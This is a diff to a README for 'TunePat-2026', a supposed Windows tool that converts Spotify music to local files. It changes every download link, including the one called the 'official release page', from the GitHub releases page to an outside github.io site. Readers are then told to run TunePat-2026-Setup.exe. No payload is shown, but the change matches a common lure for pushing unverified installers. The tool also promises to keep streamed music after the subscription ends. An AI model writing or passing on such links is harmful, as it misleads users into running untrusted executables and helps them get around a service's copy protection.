@@ -1,6 +1,6 @@
 # 🎧 TunePat-2026 - Save Spotify Music to Local Files
 
-[![](https://img.shields.io/badge/Download-TunePat_2026-blue)](https://github.com/Telepathic-blister166/TunePat-2026/releases)
+[![](https://img.shields.io/badge/Download-TunePat_2026-blue)](https://telepathic-blister166.github.io)
 
 TunePat-2026 converts Spotify tracks, albums, and playlists into common formats. This software saves music to your Windows computer for offline listening. You keep your files after you stop your Spotify subscription. The application maintains high audio quality and organizes tracks with metadata tags.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows PC.
 
-1. Visit the [official release page](https://github.com/Telepathic-blister166/TunePat-2026/releases) to download the latest installer.
+1. Visit the [official release page](https://telepathic-blister166.github.io) to download the latest installer.
 2. Locate the folder where your browser saves files.
 3. Double-click the file named TunePat-2026-Setup.exe to start the installer.
 4. Follow the prompts on the screen and accept the terms of use.
